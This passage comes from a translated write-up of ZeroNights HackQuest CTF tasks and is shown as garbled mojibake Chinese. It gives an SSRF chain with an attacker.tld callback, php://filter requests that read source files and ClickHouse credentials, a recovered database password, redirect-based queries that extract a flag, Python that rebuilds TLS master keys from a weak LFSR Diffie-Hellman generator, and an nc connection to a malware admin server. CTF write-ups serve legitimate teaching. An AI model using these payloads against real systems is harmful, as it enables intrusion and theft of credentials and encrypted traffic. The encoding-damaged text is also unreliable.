hljs">http://82.202.226.176/?callback_url=http://attacker.tld/&amp;pan=&amp;amount=&amp;payment_id=</code> </pre> <br><pre> <code class="plaintext hljs">POST / HTTP/1.0 Host: attacker.tld Connection: close Content-Length: 21 Content-Type: application/json amount=0&amp;payment_id=0</code> </pre> <br><p> ä»…å½“ç«™ç‚¹è¿”å›å­—æ¯æ•°å­—å­—ç¬¦ä¸²æ—¶ï¼Œæ‰ä¼šæ˜¾ç¤ºHTTPå“åº”ã€‚ ç­”æ¡ˆç¤ºä¾‹ï¼š </p><br><pre> <code class="plaintext hljs">{"result":"Success.","msg":"Response: testresponse"} {"result":"Invalid status code.","msg":"Non-alphanumeric response."}</code> </pre> <br><p> æˆ‘ä»¬ä»¥callback_url dataçš„å½¢å¼å°è¯•ï¼šï¼Œæµ‹è¯•å¹¶äº†è§£ï¼Œå¾ˆå¯èƒ½æ˜¯PHPã€‚ </p><br><pre> <code class="plaintext hljs">http://82.202.226.176/?callback_url=data:,test&amp;pan=&amp;amount=&amp;payment_id=</code> </pre> <br><p> æˆ‘ä»¬ä½¿ç”¨phpï¼š//è¿‡æ»¤å™¨è¯»å–æœ¬åœ°æ–‡ä»¶ï¼Œå¹¶ä½¿ç”¨convert.base64-encodeå¯¹å“åº”è¿›è¡Œç¼–ç ï¼Œä»¥ä½¿ç­”æ¡ˆä¸å­—æ¯æ•°å­—åŒ¹é…ã€‚ ç”±äºå­—ç¬¦+ï¼Œ/å’Œ=ï¼Œæœ‰æ—¶éœ€è¦ç»„åˆå‡ ä¸ªbase64è°ƒç”¨æ¥æ˜¾ç¤ºç­”æ¡ˆã€‚ </p><br><pre> <code class="plaintext hljs">http://82.202.226.176/?pan=xxx&amp;amount=xxx&amp;payment_id=xxx&amp;callback_url=php://filter/convert.base64-encode|convert.base64-encode/resource=./index.php http://82.202.226.176/?pan=xxx&amp;amount=xxx&amp;payment_id=xxx&amp;callback_url=php://filter/convert.base64-encode|convert.base64-encode/resource=./includes/db.php</code> </pre> <br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> error_reporting(<span class="hljs-number"><span class="hljs-number">0</span></span>); <span class="hljs-comment"><span class="hljs-comment">/* * DB configuration */</span></span> $config = [ <span class="hljs-string"><span class="hljs-string">'host'</span></span> =&gt; <span class="hljs-string"><span class="hljs-string">'localhost'</span></span>, <span class="hljs-string"><span class="hljs-string">'port'</span></span></code> </pre> <br><p> å“åº”è¾“å‡ºé™åˆ¶ä¸º200ä¸ªå­—èŠ‚ï¼Œä½†æ˜¯ä»è¿™äº›ç‰‡æ®µä¸­ï¼Œæˆ‘ä»¬äº†è§£äº†æœ¬åœ°ä¸»æœºä¸Šæ•°æ®åº“çš„å¯ç”¨æ€§ã€‚ æˆ‘ä»¬é€šè¿‡callback_urlå¯¹ç«¯å£è¿›è¡Œæ’åºï¼Œå¹¶<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">åœ¨DeteActåšå®¢çš„ClickHouseä¸­</a>æ‰¾åˆ°<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">æœ‰å…³æ³¨å…¥</a>çš„<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">æ–°æ–‡ç« </a> ï¼Œè¯¥æ–‡ç« ä¸å¥‡æ€ªçš„ä»»åŠ¡åç§°â€œ HOUSE OF BECHEDâ€ç›¸å¯¹åº”ã€‚ </p><br><p><img src="https://habrastorage.org/getpro/habr/post_images/5fb/f00/b42/5fbf00b42a4499e928edfd469a81e755.png" alt="https://i.imgur.com/OBn22wi.png"></p><br><p>  ClickHouseå…·æœ‰ä¸€ä¸ªHTTPæ¥å£ï¼Œå…è®¸æ‚¨æ‰§è¡Œä»»æ„è¯·æ±‚ï¼Œè¿™åœ¨SSRFä¸­ä½¿ç”¨éå¸¸æ–¹ä¾¿ã€‚ </p><br><p> æˆ‘ä»¬é˜…è¯»äº†æ–‡æ¡£ï¼Œå°è¯•ä»é…ç½®ä¸­è·å–ä¸€ä¸ªå¸æˆ·ã€‚ </p><br><pre> <code class="plaintext hljs">http://82.202.226.176/?callback_url=php://filter/convert.base64-encode|convert.base64-encode/resource=/etc/clickhouse-server/users.xml&amp;pan=&amp;amount=&amp;payment_id=</code> </pre> <br><pre> <code class="xml hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?xml version="1.0"?&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">yandex</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-comment"><span class="hljs-comment">&lt;!-- Profiles of settings. --&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">profiles</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-comment"><span class="hljs-comment">&lt;!-- Default settibm</span></span></code> </pre> <br><p> åŒæ ·ï¼Œé™åˆ¶è¾“å‡ºå¹²æ‰°ï¼Œå¹¶æ ¹æ®æ ‡å‡†æ–‡ä»¶åˆ¤æ–­ï¼Œæ‰€éœ€å­—æ®µè·ç¦»éå¸¸è¿œã€‚ </p><br><p><img src="https://habrastorage.org/getpro/habr/post_images/6e8/6f9/35f/6e86f935fc695b845a63aebbbcd76626.png" alt="https://i.imgur.com/5Un6gfj.png"></p><br><p> ä½¿ç”¨string.strip_tagsè¿‡æ»¤å™¨å‡å°‘å¤šä½™çš„éƒ¨åˆ†ã€‚ </p><br><pre> <code class="plaintext hljs">http://82.202.226.176/?callback_url=php://filter/string.strip_tags|convert.base64-encode/resource=/etc/clickhouse-server/users.xml&amp;pan=&amp;amount=&amp;payment_id=</code> </pre> <br><p> ä½†æ˜¯ç›´åˆ°æ”¶åˆ°å¯†ç åï¼Œè¾“å‡ºé•¿åº¦ä»ç„¶ä¸å¤Ÿã€‚ æ·»åŠ ä¸€ä¸ªå‹ç¼©è¿‡æ»¤å™¨zlib.deflateã€‚ </p><br><pre> <code class="plaintext hljs">http://82.202.226.176/?callback_url=php://filter/string.strip_tags|zlib.deflate|convert.base64-encode|convert.base64-encode/resource=/etc/clickhouse-server/users.xml&amp;pan=&amp;amount=&amp;payment_id=</code> </pre> <br><p> å¹¶ä»¥ç›¸åçš„é¡ºåºåœ¨æœ¬åœ°è¯»å–ï¼š </p><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">print</span></span>(file_get_contents(<span class="hljs-string"><span class="hljs-string">'php://filter/convert.base64-decode|convert.base64-decode|zlib.inflate/resource=data:,NCtYaTVWSUFBbVFTRnd1VFoyZ0FCN3hjK0JRU2tDNUt6RXZKejBXMms3QkxETkVsZUNueVNsSnFja1pxU2taK2FYRnFYbjVHYW1JQmZoZWo4a0RBeWtyZkFGME5QajBwcVdtSnBUa2xWRkNFNlJaTUVWSkZRU0JSd1JZNWxGRTFVY3NLYllVa0JiV2NFbXNGUTRYOElv'</span></span>));</code> </pre> <br><p> æ”¶åˆ°å¯†ç åï¼Œæˆ‘ä»¬å¯ä»¥æŒ‰ä»¥ä¸‹æ–¹å¼å‘é€ClickHouseè¯·æ±‚ï¼š </p><br><pre> <code class="plaintext hljs">http://localhost:8123/?query=select%20'xxx'&amp;user=default&amp;password=bechedhousenoheap http://default:bechedhousenoheap@localhost:8123/?query=select%20'xxx'</code> </pre> <br><p> ä½†æ˜¯ç”±äºæˆ‘ä»¬æœ€åˆå‘é€POSTï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä½¿ç”¨é‡å®šå‘è§£å†³æ­¤é—®é¢˜ã€‚ æœ€ç»ˆçš„è¯·æ±‚ç»“æœæ˜¯è¿™æ ·çš„ï¼ˆåœ¨æ­¤é˜¶æ®µï¼Œæˆ‘éå¸¸ç¬¨ï¼Œå› ä¸ºç”±äºå¤§é‡åµŒå¥—çš„å‚æ•°å¤„ç†ï¼Œæˆ‘ä¸æ­£ç¡®åœ°ç¼–ç äº†ç‰¹æ®Šå­—ç¬¦å¹¶ä¸”æ— æ³•æ‰§è¡Œè¯·æ±‚ï¼‰ </p><br><pre> <code class="plaintext hljs">http://82.202.226.176/?callback_url=php://filter/convert.base64-encode|convert.base64-encode|convert.base64-encode/resource=http://blackfan.ru/x?r=http://localhost:8123/%253Fquery=select%252520'xxx'%2526user=default%2526password=bechedhousenoheap&amp;pan=&amp;amount=&amp;payment_id=</code> </pre> <br><p> å¥½äº†ï¼Œé‚£å°±ä»æ•°æ®åº“ä¸­è·å–æ•°æ®ï¼š </p><br><pre> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">select</span></span> <span class="hljs-keyword"><span class="hljs-keyword">name</span></span> <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> system.tables <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> <span class="hljs-keyword"><span class="hljs-keyword">name</span></span> <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> system.columns <span class="hljs-keyword"><span class="hljs-keyword">where</span></span> <span class="hljs-keyword"><span class="hljs-keyword">table</span></span>=<span class="hljs-string"><span class="hljs-string">'flag4zn'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> bechedflag <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> flag4zn</code> </pre> <br><pre> <code class="plaintext hljs">http://82.202.226.176/?callback_url=php://filter/convert.base64-encode|convert.base64-encode|convert.base64-encode/resource=http://blackfan.ru/x?r=http://localhost:8123/%253Fquery=select%252520bechedflag%252520from%252520flag4zn%2526user=default%2526password=bechedhousenoheap&amp;pan=&amp;amount=&amp;payment_id=</code> </pre> </div></div><br><h2> ç¬¬4å¤©ã€‚ASR-EHD </h2><br><div class="scrollable-table"><table><tbody><tr><td align="center"> ä¼˜èƒœè€… </td></tr><tr><td align="center">  <b>ç¬¬ä¸€å</b> </td></tr><tr><td align="center">  AV1ct0r </td></tr></tbody></table></div><br><p> ç¬¬å››å¤©çš„ä»»åŠ¡æ˜¯ç”±<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">æ•°å­—å®‰å…¨</a>ç ”ç©¶éƒ¨é—¨å‡†å¤‡çš„ã€‚ ä»»åŠ¡çš„ä¸»è¦ä»»åŠ¡æ˜¯å±•ç¤ºå¯¹éšæœºæ•°æºçš„é”™è¯¯é€‰æ‹©å¦‚ä½•å½±å“åŠ å¯†ç®—æ³•ã€‚ åœ¨taskkaä¸­ï¼ŒåŸºäºLFSRå®ç°äº†ç”¨äºDHçš„è‡ªå†™éšæœºç§é’¥ç”Ÿæˆå™¨ã€‚ ä½¿ç”¨å…¬å…±DHå€¼æ¥æ”¶åˆ°è¶³å¤Ÿæ•°é‡çš„è¿ç»­TLSæ¡æ‰‹åï¼Œä¾¿å¯ä»¥æ¢å¤LFSRçš„åˆå§‹çŠ¶æ€å¹¶è§£å¯†æ‰€æœ‰æµé‡ã€‚ </p><br><div class="spoiler">  <b class="spoiler_title">ç¬¬å››å¤©ä»»åŠ¡çš„å†³å®šï¼ˆAV1ct0rï¼‰</b> <div class="spoiler_text"><h1 id="day-4--asr-ehd--writeup-by-av1ct0r"> ç¬¬4å¤©/ ASR-EHD-ç”±AV1ct0ræ’°å†™ </h1><br><p> å½¼å¾—æœ‰ç‚¹åæ‰§ï¼šä»–æ€»æ˜¯ä½¿ç”¨åŠ å¯†è¿æ¥ã€‚ ä¸ºç¡®ä¿ç®—æ³•å®‰å…¨ï¼ŒPeterä½¿ç”¨äº†è‡ªå·±çš„å®¢æˆ·ç«¯ã€‚ ä»–ç”šè‡³ç»™äº†æˆ‘ä»¬ä¸€ä¸ªä½¿ç”¨ä»–çš„è‡ªå®šä¹‰å®¢æˆ·ç«¯æ—¶è¿›è¡Œçš„æµé‡è½¬å‚¨ã€‚ å½¼å¾—çš„è”ç³»çœŸçš„å¾ˆå®‰å…¨å—ï¼Ÿ </p><br><p>  <a href="">https://hackquest.zeronights.org/downloads/task4/8Jdl3f_client.tar</a> <br>  <a href="">https://hackquest.zeronights.org/downloads/task4/d8f3ND_dump.tar</a> </p><br><ol><li><p> åœ¨IDA Proä¸­æ‰“å¼€å®¢æˆ·ç«¯æ–‡ä»¶ï¼Œå¹¶æŸ¥çœ‹å®ƒå¯ä»¥ä»æœåŠ¡å™¨<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">https://ssltest.a1exdandy.me:443/</a>ä¸‹è½½æ ‡å¿—æ–‡ä»¶çš„ä¸€éƒ¨åˆ†ã€‚ ä»å‘½ä»¤è¡Œè·å–è¦ä¸‹è½½æ–‡ä»¶çš„å“ªä¸€éƒ¨åˆ†ï¼ˆä»å“ªä¸ªå­—èŠ‚å¼€å§‹ï¼‰ã€‚ </p><br><pre> <code class="plaintext hljs">signed __int64 __fastcall main(int argc, char **argv, char **a3) { size_t v4; // rsi __int64 v5; // ST48_8 int v6; // [rsp+10h] [rbp-450h] int v7; // [rsp+14h] [rbp-44Ch] __int64 v8; // [rsp+20h] [rbp-440h] __int64 v9; // [rsp+28h] [rbp-438h] __int64 v10; // [rsp+30h] [rbp-430h] __int64 v11; // [rsp+38h] [rbp-428h] __int64 v12; // [rsp+40h] [rbp-420h] char ptr; // [rsp+50h] [rbp-410h] unsigned __int64 v14; // [rsp+458h] [rbp-8h] v14 = __readfsqword(0x28u); if ( argc != 3 ) return 0xFFFFFFFFLL; v6 = atoi(argv[1]); v7 = atoi(argv[2]); if ( v6 &lt; 0 || v7 &lt; 0 || v7 &lt;= v6 ) return 0xFFFFFFFFLL; v8 = 0LL; v9 = 0LL; v10 = 0LL; OPENSSL_init_ssl(0LL, 0LL); OPENSSL_init_crypto(2048LL, 0LL); v11 = ENGINE_get_default_DH(2048LL, 0LL); if ( v11 ) { if ( (unsigned int)ENGINE_init(v11) ) { v12 = ENGINE_get_DH(v11); if ( v12 ) { v8 = DH_meth_dup(v12); if ( v8 ) { if ( (unsigned int)DH_meth_set_generate_key(v8, dh_1) ) { if ( (unsigned int)ENGINE_set_DH(v11, v8) ) { v5 = TLSv1_2_client_method(v11, v8); v10 = SSL_CTX_new(v5); if ( (unsigned int)SSL_CTX_set_cipher_list(v10, "DHE-RSA-AES128-SHA256") ) { v9 = BIO_new_ssl_connect(v10); BIO_ctrl(v9, 100LL, 0LL, (__int64)"ssltest.a1exdandy.me:443"); if ( BIO_ctrl(v9, 101LL, 0LL, 0LL) &gt;= 0 ) { BIO_ctrl(v9, 101LL, 0LL, 0LL); BIO_printf(v9, "GET /flag.jpg HTTP/1.1\n", argv); BIO_printf(v9, "Host: ssltest.a1exdandy.me\n"); BIO_printf(v9, "Range: bytes=%d-%d\n\n", (unsigned int)v6, (unsigned int)v7); v4 = (signed int)BIO_read(v9, &amp;ptr, 1024LL); fwrite(&amp;ptr, v4, 1uLL, stdout); } else { v4 = 1LL; fwrite("Can't do connect\n", 1uLL, 0x11uLL, stderr); } } else { v4 = 1LL; fwrite("Can't set cipher list\n", 1uLL, 0x16uLL, stderr); } } else { v4 = 1LL; fwrite("Can't set DH methods\n", 1uLL, 0x15uLL, stderr); } } else { v4 = 1LL; fwrite("Can't set generate_key method\n", 1uLL, 0x1EuLL, stderr); } } else { v4 = 1LL; fwrite("Can't dup dh meth\n", 1uLL, 0x12uLL, stderr); } } else { v4 = 1LL; fwrite("Can't get DH\n", 1uLL, 0xDuLL, stderr); } } else { v4 = 1LL; fwrite("Can't init engine\n", 1uLL, 0x12uLL, stderr); } } else { v4 = 1LL; fwrite("Can't get DH\n", 1uLL, 0xDuLL, stderr); } if ( v11 ) { ENGINE_finish(v11, v4); ENGINE_free(v11); } if ( v8 ) DH_meth_free(v8, v4); if ( v10 ) SSL_CTX_free(v10, v4); if ( v9 ) BIO_free_all(v9, v4); return 0LL; }</code> </pre> <br><p> æœåŠ¡å™¨ä¸Šæ²¡æœ‰å¸¦æœ‰è¯¥æ ‡å¿—çš„å›¾ç‰‡ï¼Œä½†æ˜¯dump.pcapåŸæ¥æœ‰å¤§é‡çš„sslæµé‡ï¼Œå¤§æ¦‚æ˜¯å›¾ç‰‡çš„ä¸€éƒ¨åˆ†ã€‚ å¿«é€Ÿæ£€æŸ¥æœåŠ¡å™¨æ˜¯å¦å‡ºç°æ•…éšœï¼ˆçªƒå–ç”¨äºè§£å¯†æµé‡çš„ç§é’¥ï¼‰åï¼Œå‘ç°è¯¥æœåŠ¡å™¨ä¸å®¹æ˜“å—åˆ°æ”»å‡»ã€‚ æ­¤å¤–ï¼Œåœ¨SSLä¼šè¯ä¸­ï¼Œæ ¹æ®æµé‡è½¬å‚¨å’Œå®¢æˆ·ç«¯ï¼Œä½¿ç”¨DHE-RSA-AES128-SHA256å¯†ç ï¼Œå…¶ä¸­RSAä»…ç”¨äºç­¾åï¼Œå¹¶ä¸”å¯†é’¥æ ¹æ®Diffie-Hellmanæ–¹æ¡ˆè¿›è¡Œäº¤æ¢ï¼ˆæ­¤æ¨¡å¼ä¸‹çš„ä¸“ç”¨RSAæœåŠ¡å™¨å¯†é’¥æ— æµäºäº‹ï¼‰ </p><br></li><li><p> æœåŠ¡å™¨ç•¥å¸¦podirbastivï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªç®€å•çš„æ¶æ„è½¯ä»¶æ–‡ä»¶<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">https://ssltest.a1exdandy.me/x</a> ï¼Œç¼å…¥å…¶ä¸­çš„ç®¡ç†å‘˜åœ°å€ä¸º0x82C780B2697A0002ï¼ˆ0x82C780B2ï¼š0x7a69 = 178.128.199.130 opin1337ï¼‰ã€‚ å½“è¿æ¥åˆ°ç«¯å£31337æ—¶ï¼Œå‘ç°æœåŠ¡å™¨æ”¯æŒ3ä¸ªå‘½ä»¤ï¼Œå…¶ä¸­ä¸€äº›å‘½ä»¤è¦æ±‚å…¶ä»–å‚æ•° </p><br><pre> <code class="plaintext hljs">nc 178.128.199.130 31337 Yet another fucking heap task... Command: 1-3 1 - Index: - Size: 2 - Index: 3 - Index: - Length:</code> </pre> <br><p> ä½†æ˜¯ï¼Œä½¿ç”¨æ­¤ç«¯å£æ— æ³•åšè¿›ä¸€æ­¥çš„å·¥ä½œï¼Œè¿™å¾ˆå¯èƒ½æ˜¯ä¸€é¡¹åˆ†å¿ƒçš„ä»»åŠ¡ã€‚ </p><br></li><li><p> åœ¨ä»”ç»†æŸ¥çœ‹äº†å®¢æˆ·ç«¯ä¹‹åï¼Œæˆ‘çœ‹åˆ°å®ƒä½¿ç”¨äº†è‡ªå®šä¹‰çš„Diffie-Hellmanæœºå¯†ç”Ÿæˆå™¨ï¼š </p><br><pre> <code class="plaintext hljs">int __fastcall rnd_work(__int64 a1) { __int64 v1; // rsi unsigned int i; // [rsp+10h] [rbp-10h] rnd_read(); BN_bin2bn(&amp;RANDOM_512, 512LL, a1); BN_lshift1(a1, a1); v1 = (unsigned int)BITS_ind[0]; // BITS_ind dd 4096, 4095, 4081, 4069, 0 if ( (unsigned int)BN_is_bit_set(a1, (unsigned int)BITS_ind[0]) ) { for ( i = 0; i &lt;= 4; ++i ) { if ( (unsigned int)BN_is_bit_set(a1, (unsigned int)BITS_ind[i]) ) { v1 = (unsigned int)BITS_ind[i]; BN_clear_bit(a1, v1); } else { v1 = (unsigned int)BITS_ind[i]; BN_set_bit(a1, v1); } } } if ( (unsigned int)((signed int)((unsigned __int64)BN_num_bits(a1) + 7) / 8) &gt; 0x200 ) { printf("Err!", v1); exit(0); } BN_bn2binpad(a1, &amp;RANDOM_512, 512LL); return rnd_write(); }</code> </pre> <br><p> æœ€åˆï¼Œä»/ dev / urandomä¸­è¯»å–æœºå¯†ï¼ˆ512å­—èŠ‚ï¼‰å¹¶å°†å…¶ä¿å­˜åˆ°çŠ¶æ€æ–‡ä»¶ä¸­ã€‚ å¯¹äºæ¯ä¸ªåç»­è¯·æ±‚ï¼Œä»¥ä¸‹ç§˜å¯†éƒ½ä¼šå‘ç”Ÿï¼š </p><br><pre> <code class="plaintext hljs">XOR = 2**4096 + 2**4095 + 2**4081 + 2**4069 + 1 CMP = 2**4096 state *= 2 if state &gt; CMP: state ^= XOR</code> </pre> <br><p> é•¿æ•°å­—çš„æœºå¯†å‘å·¦ç§»åŠ¨1ä½ï¼Œå¦‚æœæœ€é«˜æœ‰æ•ˆä½ä¸º1ï¼Œåˆ™è¯¥æ•°å­—çš„å¸¸æ•°ä¸º5ä¸ªéé›¶ä½ï¼ˆXORï¼‰ã€‚ </p><br></li></ol><br><p> æŸ¥çœ‹pcapï¼Œæˆ‘å‘ç°ä»æœåŠ¡å™¨åˆ°è¾¾çš„Diffie-Hellmanå‚æ•°æ˜¯æ’å®šçš„ï¼š </p><br><pre> <code class="plaintext hljs">dh_g = 2 dh_p =</code> </pre> <br><p> å¹¶ä¸”æ¯æ¬¡å»ºç«‹è¿æ¥æ—¶ï¼Œå®¢æˆ·ç«¯éƒ½ä¼šå‘é€å…¶Diffie-Hellmanæœºå¯†çš„å…¬å…±éƒ¨åˆ†ã€‚ é€šè¿‡æ¯”è¾ƒç›¸é‚»ä¼šè¯çš„ç§˜å¯†çš„å…¬å¼€éƒ¨åˆ†ï¼Œæ‚¨å¯ä»¥è¿˜åŸå®¢æˆ·ç«¯çš„åˆå§‹ç§˜å¯†ï¼Œç„¶åæ¢å¤æ¯ä¸ªä¼šè¯çš„æ‰€æœ‰åç»­ç§˜å¯†ï¼š <br> å¦‚æœç§˜å¯†çš„æœ€é«˜ä½ä¸º0ï¼Œåˆ™åœ¨ä¸‹ä¸€ä¸ªä¼šè¯ä¸­ï¼Œç§˜å¯†å°†ç®€å•åœ°å¤§2å€ï¼Œå¹¶ä¸”å…¬å…±éƒ¨åˆ†å°†ä»¥pä¸ºæ¨¡çš„å¹³æ–¹ã€‚ å› æ­¤ï¼Œæœ‰å¯èƒ½æ¢å¤åˆå§‹æœºå¯†ï¼ˆä»/ dev / urandomä¸­è¯»å–çš„å†…å®¹ï¼‰ä»¥pä¸ºæ¨¡ï¼š </p><br><pre><code class="plaintext hljs">212030266574081313400816495535550771039880390539286135828101869037345869420205997453325815053364595553160004790759435995827592517178474188665111332189420650868610567156950459495593726196692754969821860322110444674367830706684288723400924718718744572072716445007789955072532338996543460287499773137785071615174311774659549109541904654568673143709587184128220277471318155757799759470829597214195494764332668485009525031739326801550115807698375007112649770412032760122054527000645191827995252649714951346955180619834783531787411998600610075175494746953236628125613177997145650859163985984159468674854699901927080143977813208682753148280937687469933353788992176066206254339449062166596095349440088429291135673308334245804375230115095159172312975679432750163246936266603077314220813042048063033927345613565227184333091534551071824033535159483541175958867122974738255966511008607723675431569961127852005437047813822454112416864211120323016008267853722731311026233323235121922969702016337164336853826598082855592007126727352041124911221048498141841625765390204460725231581416991152769176243658310857769293168120450725070030636638954553866903537931113666283836250525318798622872347839391197939468295124060629961250708172499966110406527347</code></pre><br><p> ä»ä¸­å¾ˆå®¹æ˜“è®¡ç®—å‡ºæ‰€æœ‰å…¶ä»–ä¼šè¯çš„ç§˜å¯†ã€‚ </p><br><p> è¿™é‡Œæœ‰é—®é¢˜ï¼š <br>  Aï¼‰WiresharkçŸ¥é“Diffie-Hellmançš„ç§˜å¯†ï¼Œå°±æ— æ³•è§£å¯†SSLï¼Œå¹¶ä¸”æ²¡æœ‰ç°æˆçš„è§£å†³æ–¹æ¡ˆã€‚ æˆ‘ä»¬éœ€è¦è®¡ç®—Diffie-Hellmanï¼ˆåˆç§°é¢„æŒæ¡å¯†é’¥ä¼šè¯ï¼‰çš„å…±åŒç§˜å¯†ï¼Œå¹¶ä½¿ç”¨å®ƒæ¥ä½¿ç”¨å¤§å‹è‡ªè¡Œè½¦æ‰¾åˆ°ä¸»å¯†é’¥ä¼šè¯ï¼ˆæˆ‘è®¤ä¸ºSSLä¸­æ²¡æœ‰è‡ªè¡Œè½¦ï¼‰ã€‚ æ¥ä¸‹æ¥ï¼Œæ‚¨å¯ä»¥åˆ¶ä½œä¸€ä¸ªSSLKEYLOGæ–‡ä»¶ï¼Œåœ¨å…¶ä¸­éšæœºå†™å…¥å®¢æˆ·ç«¯ï¼ˆåœ¨æ¯ä¸ªsslä¼šè¯ä¸­ï¼‰å’Œä¸»å¯†é’¥ï¼Œå¹¶åœ¨WireSharkè®¾ç½®ä¸­æŒ‡å®šSSLè§£å¯†å¹¶ä»ç†è®ºä¸Šè·åˆ©ã€‚ </p><br><p> ä½†æ˜¯åˆå‡ºç°äº†ä¸€äº›é—®é¢˜ï¼š <br>  Bï¼‰PHPè¢«è®¤ä¸ºå¤ªæ…¢äº†ï¼ˆä¸ä½¿ç”¨<code>bcadd</code> ï¼Œ <code>bcpowmod</code>å‡½æ•°...ï¼‰ï¼Œæˆ‘å†³å®šç”¨pythoné‡å†™å®ƒã€‚ <br>  Cï¼‰æ‰¾ä¸åˆ°ä»¥äººä¸ºå½¢å¼çš„é€šè¿‡é¢„ä¸»å¯†é’¥è®¡ç®—ä¸»å¯†é’¥çš„å…¬å¼ï¼Œsslå¾ˆéš¾ç†è§£ï¼Œæˆ‘ä¹Ÿæ— æ³•å¾—åˆ°opensslæ¥è¾“å‡ºä¸­é—´è®¡ç®—çš„ç»“æœã€‚ ç»“æœï¼Œæˆ‘ä½¿ç”¨äº†<a href="">ä»¥ä¸‹ä»£ç </a> ï¼Œ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">æè¿°</a>å’ŒæŸç§RFCï¼š <br><img src="https://habrastorage.org/webt/hl/ko/q6/hlkoq67uttadwf0spe68fvvgtgo.png"></p><br><p> ç»“æœï¼Œç»è¿‡åŠå¤©ï¼Œæˆ‘å¾—ä»¥è¦†ç›–äº†è¿™ä¸€ç‚¹ï¼ˆå¯¹æˆ‘æ¥è¯´ï¼Œæ²¡æœ‰è‡ªè¡Œè½¦æ˜¯ä¸å¯èƒ½çš„ï¼‰ï¼š </p><br><pre> <code class="plaintext hljs">for i in xrange(0, 4264): dh_secret = pow(srv_pubkeys[i], state, dh_p) dh_secret = hex(dh_secret)[2:-1] if len(dh_secret) % 2 : dh_secret = "0"+dh_secret while dh_secret[0:2] == "00": dh_secret = dh_secret[2:] dh_secret = dh_secret.decode("hex") seed = "master secret"+(cl_random[i].strip() + srv_random[i].strip()).decode("hex") A = seed master_key = "" for j in xrange(0, 2): A = hmac.new(dh_secret, A, hashlib.sha256).digest() master_key += hmac.new(dh_secret, A+seed, hashlib.sha256).digest() master_key = master_key[0:48].encode("hex") print "CLIENT_RANDOM " + cl_random[i].strip() + " " + master_key state *= 2 if state &gt; CMP: state ^= XOR</code> </pre> <br><p>  Dï¼‰ä¸ºäº†å‰¥å¤ºå„ç§å®¢æˆ·ç«¯çš„éšæœºæ€§ï¼Œ...ä»Wiresharkä¼šè¯ä¸­å¯¼å‡ºåˆ°csvï¼Œå¹¶æœç´¢csvä½œä¸ºâ€œ ...â€å¾—åˆ°çš„åŸå§‹æµé‡ã€‚ </p><br><p>  Eï¼‰ä¸ºäº†è§£å¯†4264ä¸ªä¼šè¯ï¼ŒWireSharkå†³å®šåƒæ‰è®¸å¤šGBçš„æ“ä½œå‘˜ï¼ˆå¯¹äºä»–æ¥è¯´ï¼Œè¿™è¿˜ä¸å¤Ÿ8ï¼‰ï¼Œä½†æ˜¯ä»€ä¹ˆä¹Ÿæ²¡åšï¼Œæ‚¨å¯ä»¥åœ¨åŠŸèƒ½å¼ºå¤§çš„è®¡ç®—æœºä¸Šè¿è¡Œæ‰€æœ‰å†…å®¹ï¼Œè€Œä¸èƒ½åœ¨æ€§èƒ½è¾ƒå¼±çš„ç¬”è®°æœ¬ç”µè„‘ä¸Šè¿è¡Œã€‚ ä½†æ˜¯ï¼Œåœ¨å¯¼å‡ºhttpå¯¹è±¡ï¼ˆå›¾ç‰‡çš„è§£å¯†ç‰‡æ®µï¼‰æ—¶ï¼ŒWireSharkåªèƒ½ä¿å­˜å‰1000ä¸ªæ–‡ä»¶ï¼Œç„¶åå…¶ç¼–å·ç»“æŸã€‚ ç»“æœï¼Œæˆ‘ä¸å¾—ä¸å°†pcapåˆ†æˆæ¯ä¸ª1000 tcpä¼šè¯çš„5ä¸ªéƒ¨åˆ†ã€‚ ç²˜è´´æ‰€æœ‰ç‰‡æ®µåï¼Œç»“æœæ˜¯ä¸€å¹…å¦‚æ­¤ç¾ä¸½çš„å›¾ç”»ï¼š </p><br><p><img src="https://habrastorage.org/webt/kn/op/xh/knopxh0nebqck4xuix2kvgmoyju.png"></p></div></div><br><p> è·èƒœè€…ç”¨äºè§£å†³ä»»åŠ¡çš„æ‰€æœ‰æ–‡ä»¶éƒ½å¯ä»¥åœ¨<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">æ­¤å¤„</a>æ‰¾åˆ°ã€‚ </p><br><h2> ç¬¬äº”å¤©ï¼Œä¿æŠ¤å£³ </h2><br><div class="scrollable-table"><table><tbody><tr><td colspan="3" align="center"> ä¼˜èƒœè€… </td></tr><tr><td align="center">  <b>ç¬¬ä¸€å</b> </td><td align="center">  